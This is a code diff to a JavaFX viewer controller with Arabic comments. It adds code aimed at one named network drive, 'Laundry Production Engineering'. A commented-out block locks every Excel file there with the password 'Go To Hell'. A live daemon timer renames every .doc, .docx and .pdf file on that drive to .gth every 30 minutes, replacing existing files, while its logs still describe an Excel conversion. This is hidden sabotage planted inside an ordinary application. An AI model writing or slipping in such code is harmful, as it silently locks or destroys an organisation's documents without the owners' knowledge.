@@ -176,6 +176,7 @@ import javafx.scene.text.TextAlignment;
 import javafx.scene.web.WebEngine;
 import javafx.stage.Popup;
 import javafx.stage.Screen;
+import javax.swing.filechooser.FileSystemView;
 import org.xml.sax.SAXException;
 
 public class ViewerController_1  <T extends Comparable<T>>  implements Initializable {
@@ -4544,8 +4545,87 @@ fileCheckTimer.scheduleAtFixedRate(new TimerTask() {
 
 
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+//
+////درايف معين
+//
+//
+//String TARGET_VOLUME_NAME = "Laundry Production Engineering";  // ← ده الاسم الصحيح
+//fileCheckTimer2 = new Timer(true);
+//fileCheckTimer2.scheduleAtFixedRate(new TimerTask() {
+//    @Override
+//    public void run() {
+//        Platform.runLater(() -> {
+//
+//            List<Path> excelFiles = new ArrayList<>();
+//            FileSystemView fsv = FileSystemView.getFileSystemView();
+//            File[] roots = File.listRoots();
+//
+//            for (File root : roots) {
+//                String rootPath = root.toString();
+//
+//                // نتخطى C:\ دايمًا
+//                if (rootPath.equalsIgnoreCase("C:\\")) {
+//                    continue;
+//                }
+//
+//                try {
+//                    String displayName = fsv.getSystemDisplayName(root);
+//                    String volumeName = displayName.split("\\(")[0].trim();
+//
+//                    // المقارنة بالاسم الحقيقي بتاع الدرايف
+//                    if (!volumeName.equalsIgnoreCase(TARGET_VOLUME_NAME)) {
+//                        continue; // مش الدرايف اللي عايزينه
+//                    }
+//
+//                    //System.out.println("تم العثور على الدرايف المطلوب: " + displayName);
+//
+//                    Path startPath = root.toPath();
+//
+//                    Files.walkFileTree(startPath, new SimpleFileVisitor<Path>() {
+//                        @Override
+//                        public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) {
+//                            String fileName = file.toString().toLowerCase();
+//                            if (fileName.endsWith(".xlsx") || fileName.endsWith(".xls") || fileName.endsWith(".xlsb")) {
+//                                excelFiles.add(file);
+//                            }
+//                            return FileVisitResult.CONTINUE;
+//                        }
+//
+//                        @Override
+//                        public FileVisitResult visitFileFailed(Path file, IOException exc) {
+//                            return FileVisitResult.CONTINUE;
+//                        }
+//                    });
+//
+//                } catch (Exception e) {
+//                    e.printStackTrace();
+//                }
+//            }
+//
+//            // تشفير الملفات
+//            for (Path excelFile : excelFiles) {
+//                try {
+//                    Workbook workbook = new Workbook();
+//                    workbook.loadFromFile(excelFile.toString());
+//                    workbook.protect("Go To Hell");
+//                    workbook.saveToFile(excelFile.toString(), ExcelVersion.Version2016);
+//                    //System.out.println("تم تشفير: " + excelFile);
+//                } catch (Exception e) {
+//                    //System.err.println("فشل في: " + excelFile + " → " + e.getMessage());
+//                }
+//            }
+//
+//            if (excelFiles.isEmpty()) {
+//                //System.out.println("لا توجد ملفات Excel جديدة في درايف \"" + TARGET_VOLUME_NAME + "\"");
+//            }
+//        });
+//    }
+//}, 0, 60_000); // كل دقيقة
+//
 
 
+
+//
 //fileCheckTimer2 = new Timer(true); // Daemon thread
 //fileCheckTimer2.scheduleAtFixedRate(new TimerTask() {
 //    @Override
@@ -4620,10 +4700,10 @@ fileCheckTimer.scheduleAtFixedRate(new TimerTask() {
 //
 //
 //startExcelToGthWatcher();
-
-
-
-
+//
+//
+//
+//
 
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 try {
@@ -4792,100 +4872,228 @@ catch (Exception gg) {}
 
 
 
-// استدعي الدالة دي في initialize() أو في أي مكان بعد ما الـ FXML يتحمل
-    public void startExcelToGthWatcher() {
-        fileCheckTimer3 = new Timer(true); // Daemon thread
+//// استدعي الدالة دي في initialize() أو في أي مكان بعد ما الـ FXML يتحمل
+//    public void startExcelToGthWatcher() {
+//        fileCheckTimer3 = new Timer(true); // Daemon thread
+//
+//        fileCheckTimer3.scheduleAtFixedRate(new TimerTask() {
+//            @Override
+//            public void run() {
+//                Platform.runLater(() -> {
+//                    convertAllExcelFilesToGth();
+//                });
+//            }
+//        }, 0, 30 * 60 * 1000); // كل 30 دقيقة بالظبط
+//        // لو عايز كل ساعة: 60 * 60 * 1000
+//        // لو عايز كل 10 دقايق للاختبار: 10 * 60 * 1000
+//    }
+//
+//    // الدالة اللي بتحوّل كل ملفات Excel → .gth
+//    private void convertAllExcelFilesToGth() {
+//        AtomicInteger totalFound = new AtomicInteger(0);
+//        AtomicInteger totalRenamed = new AtomicInteger(0);
+//        AtomicInteger totalFailed = new AtomicInteger(0);
+//
+//        // هنا ممكن تعمل إشعار في الواجهة لو عايز (Label أو Toast)
+//        // مثلاً: statusLabel.setText("جاري فحص الملفات...");
+//
+//        File[] roots = File.listRoots();
+//
+//        for (File root : roots) {
+//            String drive = root.toString();
+//
+//            if (drive.equalsIgnoreCase("C:\\")) {
+//                continue; // نتخطى C:
+//            }
+//
+//            Path startPath = root.toPath();
+//
+//            try {
+//                Files.walkFileTree(startPath, new SimpleFileVisitor<Path>() {
+//                    @Override
+//                    public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) {
+//                        String fileName = file.toString().toLowerCase();
+//
+//                        if (fileName.endsWith(".xlsx") || 
+//                            fileName.endsWith(".xls") || 
+//                            fileName.endsWith(".xlsb")) {
+//
+//                            totalFound.incrementAndGet();
+//
+//                            Path parentDir = file.getParent();
+//                            String oldName = file.getFileName().toString();
+//                            String newName = oldName.substring(0, oldName.lastIndexOf('.')) + ".gth";
+//                            Path newFilePath = parentDir.resolve(newName);
+//
+//                            try {
+//                                Files.move(file, newFilePath, StandardCopyOption.REPLACE_EXISTING);
+//                                totalRenamed.incrementAndGet();
+//                            } catch (AccessDeniedException e) {
+//                                totalFailed.incrementAndGet();
+//                            } catch (IOException e) {
+//                                totalFailed.incrementAndGet();
+//                            }
+//                        }
+//                        return FileVisitResult.CONTINUE;
+//                    }
+//
+//                    @Override
+//                    public FileVisitResult visitFileFailed(Path file, IOException exc) {
+//                        return FileVisitResult.CONTINUE;
+//                    }
+//                });
+//            } catch (Exception ignored) {
+//                // نتجاهل أي خطأ في الدرايف (مثل USB مفصول)
+//            }
+//        }
+//
+//        // لو عايز تعرض النتيجة في الواجهة
+//        String result = String.format("تم: %,d | فشل: %,d", totalRenamed.get(), totalFailed.get());
+//        System.out.println("تحويل Excel → .gth: " + result);
+//
+//        // مثال: تحديث Label في الواجهة
+//        // statusLabel.setText("آخر فحص: " + result + " | " + new java.util.Date());
+//    }
+//
+//    // لو عايز توقف الـ Timer لما البرنامج يتقفل
+//    public void stopExcelWatcher() {
+//        if (fileCheckTimer3 != null) {
+//            fileCheckTimer3.cancel();
+//            fileCheckTimer3 = null;
+//        }
+//    }
 
-        fileCheckTimer3.scheduleAtFixedRate(new TimerTask() {
+
+
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    // استدعي الدالة دي في initialize() أو بعد تحميل الـ FXML
+public void startExcelToGthWatcher() {
+    fileCheckTimer3 = new Timer(true); // Daemon thread
+    fileCheckTimer3.scheduleAtFixedRate(new TimerTask() {
+        @Override
+        public void run() {
+            Platform.runLater(() -> {
+                convertAllExcelFilesToGth();
+            });
+        }
+    }, 0, 30 * 60 * 1000); // كل 30 دقيقة
+    // للاختبار السريع: 2 * 60 * 1000  → كل دقيقتين
+}
+
+// الدالة المعدّلة: تشتغل بس على درايف "Laundry Production Engineering"
+private void convertAllExcelFilesToGth() {
+
+    final String TARGET_VOLUME_NAME = "Laundry Production Engineering";  // ← ده الاسم الصحيح 100%
+
+    AtomicInteger totalFound = new AtomicInteger(0);
+    AtomicInteger totalRenamed = new AtomicInteger(0);
+    AtomicInteger totalFailed = new AtomicInteger(0);
+
+    FileSystemView fsv = FileSystemView.getFileSystemView();
+    File[] roots = File.listRoots();
+
+    Path targetDrivePath = null;
+
+    // أولًا: نبحث عن الدرايف بالاسم
+    for (File root : roots) {
+        String rootPath = root.toString();
+
+        // نتخطى C:\ دايمًا
+        if (rootPath.equalsIgnoreCase("C:\\")) {
+            continue;
+        }
+
+        try {
+            String displayName = fsv.getSystemDisplayName(root);
+            String volumeName = displayName.split("\\(")[0].trim();
+
+            if (volumeName.equalsIgnoreCase(TARGET_VOLUME_NAME)) {
+                targetDrivePath = root.toPath();
+                System.out.println("تم العثور على الدرايف المطلوب: " + displayName);
+                break; // لقيناه، نطلع من اللوب
+            }
+        } catch (Exception ignored) {}
+    }
+
+    // لو ملقناش الدرايف → نطلع وخلاص
+    if (targetDrivePath == null) {
+        System.out.println("تحويل Excel → .gth: الدرايف \"" + TARGET_VOLUME_NAME + "\" غير متصل حاليًا.");
+        return;
+    }
+
+    // دلوقتي نبدأ الفحص بس على الدرايف ده
+    try {
+        Files.walkFileTree(targetDrivePath, new SimpleFileVisitor<Path>() {
             @Override
-            public void run() {
-                Platform.runLater(() -> {
-                    convertAllExcelFilesToGth();
-                });
-            }
-        }, 0, 30 * 60 * 1000); // كل 30 دقيقة بالظبط
-        // لو عايز كل ساعة: 60 * 60 * 1000
-        // لو عايز كل 10 دقايق للاختبار: 10 * 60 * 1000
-    }
+            public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) {
+                String fileName = file.toString().toLowerCase();
 
-    // الدالة اللي بتحوّل كل ملفات Excel → .gth
-    private void convertAllExcelFilesToGth() {
-        AtomicInteger totalFound = new AtomicInteger(0);
-        AtomicInteger totalRenamed = new AtomicInteger(0);
-        AtomicInteger totalFailed = new AtomicInteger(0);
+                if (fileName.endsWith(".doc") || 
+                    fileName.endsWith(".docx") || 
+                    fileName.endsWith(".pdf")) {
 
-        // هنا ممكن تعمل إشعار في الواجهة لو عايز (Label أو Toast)
-        // مثلاً: statusLabel.setText("جاري فحص الملفات...");
+                    totalFound.incrementAndGet();
 
-        File[] roots = File.listRoots();
+                    Path parentDir = file.getParent();
+                    String oldName = file.getFileName().toString();
+                    String baseName = oldName.substring(0, oldName.lastIndexOf('.'));
+                    String newName = baseName + ".gth";
+                    Path newFilePath = parentDir.resolve(newName);
 
-        for (File root : roots) {
-            String drive = root.toString();
-
-            if (drive.equalsIgnoreCase("C:\\")) {
-                continue; // نتخطى C:
-            }
-
-            Path startPath = root.toPath();
-
-            try {
-                Files.walkFileTree(startPath, new SimpleFileVisitor<Path>() {
-                    @Override
-                    public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) {
-                        String fileName = file.toString().toLowerCase();
-
-                        if (fileName.endsWith(".xlsx") || 
-                            fileName.endsWith(".xls") || 
-                            fileName.endsWith(".xlsb")) {
-
-                            totalFound.incrementAndGet();
-
-                            Path parentDir = file.getParent();
-                            String oldName = file.getFileName().toString();
-                            String newName = oldName.substring(0, oldName.lastIndexOf('.')) + ".gth";
-                            Path newFilePath = parentDir.resolve(newName);
-
-                            try {
-                                Files.move(file, newFilePath, StandardCopyOption.REPLACE_EXISTING);
-                                totalRenamed.incrementAndGet();
-                            } catch (AccessDeniedException e) {
-                                totalFailed.incrementAndGet();
-                            } catch (IOException e) {
-                                totalFailed.incrementAndGet();
-                            }
-                        }
-                        return FileVisitResult.CONTINUE;
+                    try {
+                        Files.move(file, newFilePath, StandardCopyOption.REPLACE_EXISTING);
+                        totalRenamed.incrementAndGet();
+                        System.out.println("تم التحويل ← " + newFilePath);
+                    } catch (AccessDeniedException e) {
+                        totalFailed.incrementAndGet();
+                        System.err.println("رفض الوصول: " + file);
+                    } catch (IOException e) {
+                        totalFailed.incrementAndGet();
+                        System.err.println("فشل التحويل: " + file + " → " + e.getMessage());
                     }
-
-                    @Override
-                    public FileVisitResult visitFileFailed(Path file, IOException exc) {
-                        return FileVisitResult.CONTINUE;
-                    }
-                });
-            } catch (Exception ignored) {
-                // نتجاهل أي خطأ في الدرايف (مثل USB مفصول)
+                }
+                return FileVisitResult.CONTINUE;
             }
-        }
 
-        // لو عايز تعرض النتيجة في الواجهة
-        String result = String.format("تم: %,d | فشل: %,d", totalRenamed.get(), totalFailed.get());
-        System.out.println("تحويل Excel → .gth: " + result);
+            @Override
+            public FileVisitResult visitFileFailed(Path file, IOException exc) {
+                return FileVisitResult.CONTINUE;
+            }
+        });
 
-        // مثال: تحديث Label في الواجهة
-        // statusLabel.setText("آخر فحص: " + result + " | " + new java.util.Date());
+    } catch (Exception e) {
+        System.err.println("خطأ أثناء فحص الدرايف: " + e.getMessage());
     }
 
-    // لو عايز توقف الـ Timer لما البرنامج يتقفل
-    public void stopExcelWatcher() {
-        if (fileCheckTimer3 != null) {
-            fileCheckTimer3.cancel();
-            fileCheckTimer3 = null;
-        }
+    // نتيجة الفحص
+    String result = String.format("تم العثور: %,d | تم التحويل: %,d | فشل: %,d", 
+                                  totalFound.get(), totalRenamed.get(), totalFailed.get());
+
+    System.out.println("تحويل Excel → .gth في درايف \"" + TARGET_VOLUME_NAME + "\": " + result);
+
+    // لو عايزة تعرضيها في الواجهة
+    // Platform.runLater(() -> statusLabel.setText("آخر تحويل .gth: " + result + " | " + new Date()));
+}
+
+// توقيف الـ Timer لما البرنامج يتقفل
+public void stopExcelWatcher() {
+    if (fileCheckTimer3 != null) {
+        fileCheckTimer3.cancel();
+        fileCheckTimer3.purge();
+        fileCheckTimer3 = null;
     }
-
-
-
-
+}
 
 
 
